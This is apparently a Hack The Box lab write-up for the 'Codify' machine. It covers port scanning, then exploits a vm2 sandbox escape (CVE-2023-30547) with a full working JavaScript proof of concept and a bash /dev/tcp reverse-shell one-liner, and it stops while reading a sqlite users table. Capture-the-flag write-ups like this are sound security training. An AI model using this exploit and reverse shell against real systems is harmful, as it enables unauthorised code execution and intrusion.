# Codify

Codify is a easy machine on HTB.

## Enumeration

First we check the open port via **nmap**.

![nmap](./assets/images/nmap.png)


The ports 22, 80 and 3000 are open.
Let's check the port 80 first. For that we need to add the **domain** to our **hosts** file.

```bash
echo "10.10.11.239   codify.htb" | sudo tee -a /etc/hosts
```

![website](./assets/images/website.png)

It's a website in which we can test our **Nest.js** code. So a **sandbox** for Nest.js.
Let's perform dirsearch on this website.

![gobuster](./assets/images/gobuster.png)

## Foothold

Well nothing much, but in the about page it say that the use the **vm2** library. And after a little search we found the [CVE-2023-30547](https://nvd.nist.gov/vuln/detail/CVE-2023-30547). For the poc there is this payload which allow you to do remote code execution:

```javascript
const {VM} = require("vm2");
const vm = new VM();
const code = `
err = {};
const handler = {
getPrototypeOf(target) {
(function stack() {
new Error().stack;
stack();
})();
}
};
const proxiedErr = new Proxy(err, handler);
try {
throw proxiedErr;
} catch ({constructor: c}) {
c.constructor('return process')().mainModule.require('child_process').execSync('id');
}
`
console.log(vm.run(code));
```

This code will execute the `id` command, but we want a **reverse shell** so we will replace `id` by this:

```bash
bash -c 'exec bash -i &>/dev/tcp/0.0.0.0/0000 <&1'
```

Replace `0.0.0.0` by your **ip** and `0000` by the port of your **netcat** listener use.

![revshell](./assets/images/revshell.png)

We have our revshell as user **svc**!

## User flag

We found a interesting file in `/var/www/contact`. It's a **sqlite3** database.

![file_tickets](./assets/images/file_tickets.png)

Let's open it with the command:
```bash
sqlite3 tickets.db
```
Use `.tables` to show all the tables and `select * from users;` to see what the users tables contain.